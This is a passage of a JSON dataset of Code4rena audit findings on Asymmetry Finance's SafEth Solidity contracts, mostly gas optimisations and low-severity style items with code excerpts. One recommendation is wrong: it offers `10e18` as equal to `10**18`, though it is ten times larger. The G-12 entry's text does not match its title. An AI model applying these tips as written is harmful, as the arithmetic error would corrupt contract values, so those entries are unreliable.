      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19977",
      "title": "[G-12] Use functions instead of modifiers",
      "impact": "GAS",
      "content": "\n### Proof Of Concept\n\n```solidity\n52: ERC20Upgradeable.__ERC20_init(_tokenName, _tokenSymbol);\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L52\n\n### Recommended Mitigation Steps\nFunctions guaranteed to revert when called by normal users can be marked payable.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19976",
      "title": "[G-11] Using `unchecked` blocks to save gas",
      "impact": "GAS",
      "content": "\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isnt possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an `unchecked` block.\n\n### Proof Of Concept\n\n```solidity\n122: uint256 ethAmountToWithdraw = ethAmountAfter - ethAmountBefore;\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L122\n\n```solidity\n174: ((10 ** 18 - maxSlippage))) / 10 ** 18);\n201: uint256 rethMinted = rethBalance2 - rethBalance1;\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L174\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L201\n\n```solidity\n75: (10 ** 18 - maxSlippage)) / 10 ** 18;\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L75\n\n```solidity\n60: uint256 minOut = (stEthBal * (10 ** 18 - maxSlippage)) / 10 ** 18;\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L60\n\n```solidity\n79: uint256 wstEthAmount = wstEthBalancePost - wstEthBalancePre;\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L79\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19975",
      "title": "[G-10] Non-usage of specific imports",
      "impact": "GAS",
      "content": "\nThe current form of relative path import is not recommended for use because it can unpredictably pollute the namespace.<br>\nInstead, the Solidity docs recommend specifying imported symbols explicitly.<br>\nhttps://docs.soliditylang.org/en/v0.8.15/layout-of-source-files.html#importing-other-source-files\n\nA good example:\n```solidity\nimport {OwnableUpgradeable} from \"openzeppelin-contracts-upgradeable/contracts/access/OwnableUpgradeable.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {SafeCastLib} from \"solmate/utils/SafeCastLib.sol\";\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {IProducer} from \"src/interfaces/IProducer.sol\";\nimport {GlobalState, UserState} from \"src/Common.sol\";\n```\n\n### Proof Of Concept\n\n```solidity\n5: import \"../interfaces/IWETH.sol\";\n6: import \"../interfaces/uniswap/ISwapRouter.sol\";\n7: import \"../interfaces/lido/IWStETH.sol\";\n8: import \"../interfaces/lido/IstETH.sol\";\n10: import \"./SafEthStorage.sol\";\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L5\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L6\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L7\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L8\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L10\n\n```solidity\n4: import \"../../interfaces/IDerivative.sol\";\n5: import \"../../interfaces/frax/IsFrxEth.sol\";\n7: import \"../../interfaces/rocketpool/RocketStorageInterface.sol\";\n8: import \"../../interfaces/rocketpool/RocketTokenRETHInterface.sol\";\n9: import \"../../interfaces/rocketpool/RocketDepositPoolInterface.sol\";\n10: import \"../../interfaces/rocketpool/RocketDAOProtocolSettingsDepositInterface.sol\";\n11: import \"../../interfaces/IWETH.sol\";\n12: import \"../../interfaces/uniswap/ISwapRouter.sol\";\n14: import \"../../interfaces/uniswap/IUniswapV3Factory.sol\";\n15: import \"../../interfaces/uniswap/IUniswapV3Pool.sol\";\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L4\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L5\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L7\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L8\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L9\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L10\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L11\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L12\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L14\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L15\n\n```solidity\n4: import \"../../interfaces/IDerivative.sol\";\n5: import \"../../interfaces/frax/IsFrxEth.sol\";\n8: import \"../../interfaces/curve/IFrxEthEthPool.sol\";\n9: import \"../../interfaces/frax/IFrxETHMinter.sol\";\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L4\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L5\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L8\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L9\n\n```solidity\n4: import \"../../interfaces/IDerivative.sol\";\n7: import \"../../interfaces/curve/IStEthEthPool.sol\";\n8: import \"../../interfaces/lido/IWStETH.sol\";\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L4\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L7\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L8\n\n### Recommended Mitigation Steps\n\nUse specific imports syntax per solidity docs recommendation.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19974",
      "title": "[G-09] Public Functions To External",
      "impact": "GAS",
      "content": "\nThe following functions could be set external to save gas and improve code quality.<br>\nExternal call cost is less expensive than of public functions.\n\n### Proof Of Concept\n\n```solidity\nfunction name() public pure returns (string memory) {\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L50\n\n```solidity\nfunction ethPerDerivative(uint256 _amount) public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L211\n\n```solidity\nfunction balance() public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L221\n\n```solidity\nfunction name() public pure returns (string memory) {\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L44\n\n```solidity\nfunction ethPerDerivative(uint256 _amount) public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L111\n\n```solidity\nfunction balance() public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L122\n\n```solidity\nfunction name() public pure returns (string memory) {\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L41\n\n```solidity\nfunction ethPerDerivative(uint256 _amount) public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L86\n\n```solidity\nfunction balance() public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L93\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19973",
      "title": "[G-08] `<x> += <y>` Costs More Gas Than `<x> = <x> + <y>` For State Variables",
      "impact": "GAS",
      "content": "\n### Proof Of Concept\n\n```solidity\n72: underlyingValue +=\n95: totalStakeValueEth += derivativeReceivedEthValue;\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L72\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L95\n\n```solidity\n172: localTotalWeight += weights[i];\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L172\n\n```solidity\n192: localTotalWeight += weights[i];\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L192\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19972",
      "title": "[G-07] Optimize names to save gas",
      "impact": "GAS",
      "content": "\nContracts most called functions could simply save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. \n\nSee more [here](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92).\n\n### Proof Of Concept\n\nAll in-scope contracts.\n\n### Recommended Mitigation Steps\nFind a lower method ID name for the most called functions for example Call() vs. Call1() is cheaper by 22 gas.<br>\nFor example, the function IDs in the Gauge.sol contract will be the most used; A lower method ID may be given.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19971",
      "title": "[G-06] Use hardcode address instead `address(this)`",
      "impact": "GAS",
      "content": "\nInstead of using `address(this)`, it is more gas-efficient to pre-calculate and use the hardcoded `address`. Foundry's script.sol and solmate's `LibRlp.sol` contracts can help achieve this.\n\nReferences:<br>\n- https://book.getfoundry.sh/reference/forge-std/compute-create-address \n- https://twitter.com/transmissions11/status/1518507047943245824\n\n### Proof Of Concept\n\n```solidity\n111: uint256 ethAmountBefore = address(this).balance;\n121: uint256 ethAmountAfter = address(this).balance;\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L111\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L121\n\n```solidity\n139: uint256 ethAmountBefore = address(this).balance;\n144: uint256 ethAmountAfter = address(this).balance;\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L139\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L144\n\n```solidity\n96: recipient: address(this),\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L96\n\n```solidity\n110: (bool sent, ) = address(msg.sender).call{value: address(this).balance}(\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L110\n\n```solidity\n197: uint256 rethBalance1 = rocketTokenRETH.balanceOf(address(this));\n199: uint256 rethBalance2 = rocketTokenRETH.balanceOf(address(this));\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L197\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L199\n\n```solidity\n222: return IERC20(rethAddress()).balanceOf(address(this));\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L222\n\n```solidity\n63: address(this),\n63: address(this)\n63: address(this)\n84: (bool sent, ) = address(msg.sender).call{value: address(this).balance}(\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L63\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L63\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L63\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L84\n\n```solidity\n99: address(this)\n101: frxETHMinterContract.submitAndDeposit{value: msg.value}(address(this));\n99: address(this)\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L99\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L101\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L99\n\n```solidity\n123: return IERC20(SFRX_ETH_ADDRESS).balanceOf(address(this));\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L123\n\n```solidity\n58: uint256 stEthBal = IERC20(STETH_TOKEN).balanceOf(address(this));\n63: (bool sent, ) = address(msg.sender).call{value: address(this).balance}(\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L58\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L63\n\n```solidity\n74: uint256 wstEthBalancePre = IWStETH(WST_ETH).balanceOf(address(this));\n78: uint256 wstEthBalancePost = IWStETH(WST_ETH).balanceOf(address(this));\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L74\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L78\n\n```solidity\n94: return IERC20(WST_ETH).balanceOf(address(this));\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L94\n\n### Recommended Mitigation Steps\n\nUse hardcoded `address`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19970",
      "title": "[G-05] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier or require such as onlyOwner/onlyX is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2), DUP1(3), ISZERO(3), PUSH2(3), JUMPI(10), PUSH1(3), DUP1(3), REVERT(0), JUMPDEST(1), POP(2) which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.\n\n### Proof Of Concept\n\n```solidity\n138: function rebalanceToWeights() external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L138\n\n```solidity\n165: function adjustWeight(\n        uint256 _derivativeIndex,\n        uint256 _weight\n    ) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L165\n\n```solidity\n182: function addDerivative(\n        address _contractAddress,\n        uint256 _weight\n    ) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L182\n\n```solidity\n202: function setMaxSlippage(\n        uint _derivativeIndex,\n        uint _slippage\n    ) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L202\n\n```solidity\n214: function setMinAmount(uint256 _minAmount) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L214\n\n```solidity\n223: function setMaxAmount(uint256 _maxAmount) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L223\n\n```solidity\n232: function setPauseStaking(bool _pause) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L232\n\n```solidity\n241: function setPauseUnstaking(bool _pause) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L241\n\n```solidity\n58: function setMaxSlippage(uint256 _slippage) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L58\n\n```solidity\n107: function withdraw(uint256 amount) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L107\n\n```solidity\n156: function deposit() external payable onlyOwner returns (uint256) {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L156\n\n```solidity\n51: function setMaxSlippage(uint256 _slippage) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L51\n\n```solidity\n60: function withdraw(uint256 _amount) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L60\n\n```solidity\n94: function deposit() external payable onlyOwner returns (uint256) {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L94\n\n```solidity\n48: function setMaxSlippage(uint256 _slippage) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L48\n\n```solidity\n56: function withdraw(uint256 _amount) external onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L56\n\n```solidity\n73: function deposit() external payable onlyOwner returns (uint256) {\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L73\n\n### Recommended Mitigation Steps\nFunctions guaranteed to revert when called by normal users can be marked payable.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19969",
      "title": "[G-04] Using `delete` statement can save gas",
      "impact": "GAS",
      "content": "\n### Proof Of Concept\n\n```solidity\n68: uint256 underlyingValue = 0;\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L68\n\n```solidity\n170: uint256 localTotalWeight = 0;\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L170\n\n```solidity\n190: uint256 localTotalWeight = 0;\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L190\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19968",
      "title": "[G-03] Empty Blocks Should Be Removed Or Emit Something",
      "impact": "GAS",
      "content": "\nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be abstract and the function signatures be added without any default implementation. If the block is an empty if-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (if(x){}else if(y){...}else{...} => if(!x){if(y){...}else{...}})\n\n### Proof Of Concept\n\n```solidity\n246: receive() external payable {}\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L246\n\n```solidity\n244: receive() external payable {}\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L244\n\n```solidity\n126: receive() external payable {}\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L126\n\n```solidity\n97: receive() external payable {}\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L97\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19967",
      "title": "[G-02] Duplicated `require()`/`revert()` Checks Should Be Refactored To A Modifier Or Function",
      "impact": "GAS",
      "content": "\nSaves deployment costs.\n\n### Proof Of Concept\n\n```solidity\n66: require(sent, \"Failed to send Ether\");\n77: require(sent, \"Failed to send Ether\");\n\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L66\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L77\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19966",
      "title": "[G-01] Setting the `constructor` to `payable`",
      "impact": "GAS",
      "content": "\nSaves ~13 gas per instance.\n\n### Proof Of Concept\n\n```solidity\n38: constructor()\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L38\n\n```solidity\n33: constructor()\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L33\n\n```solidity\n27: constructor()\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L27\n\n```solidity\n24: constructor()\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L24\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19965",
      "title": "[30] Package @balancer-labs/balancer-js is not used",
      "impact": "LOW",
      "content": "\nThe package @balancer-labs/balancer-js is deprecated and balancer recommends to use the @balancer-labs/sdk package instead. Also, this package is currently unused on the tests and deployment setups. Consider removing this package. \n\nThis is not a vulnerability, but removing this package is beneficial to the project, since unnecessary packages incurs overhead and increases the project download time and size.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/package.json#L78\n\n**[toshiSat (Asymmetry) confirmed](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/967#issuecomment-1500677486)**\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/967#issuecomment-1535992644):**\n > 14, 15, 16, & 20 are GAS findings more than QA.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19964",
      "title": "[29] Can use ternary",
      "impact": "LOW",
      "content": "\nThe following instance can use a ternary expression instead of a conditional.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L78-L81\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19963",
      "title": "[28] Interchangeable usage of uint and uint256",
      "impact": "LOW",
      "content": "\nConsider using only one approach, e.g. only uint256.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L91-L92\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19962",
      "title": "[27] Replace `variable == false` with `!variable`",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L64\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19961",
      "title": "[26] Specify the warning being disabled by the linter",
      "impact": "LOW",
      "content": "\nConsider also adding the name of the warning being disabled, e.g. `// solhint-disable-next-line warning-name`.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L123-L126\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19960",
      "title": "[25] Use scientific notation rather than exponentiation",
      "impact": "LOW",
      "content": "\nScientific notation can be used for better code readability, e.g. consider using using `10e18` and `10e17` instead of `10**18` and `10**17`.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L54-L55\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19959",
      "title": "[24] Add a limit for the maximum number of characters per line",
      "impact": "LOW",
      "content": "\nThe solidity [documentation](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#maximum-line-length) recommends a maximum of 120 characters.\n\nConsider adding a limit of 120 characters or less to prevent large lines.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L142\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19958",
      "title": "[23] Order of functions",
      "impact": "LOW",
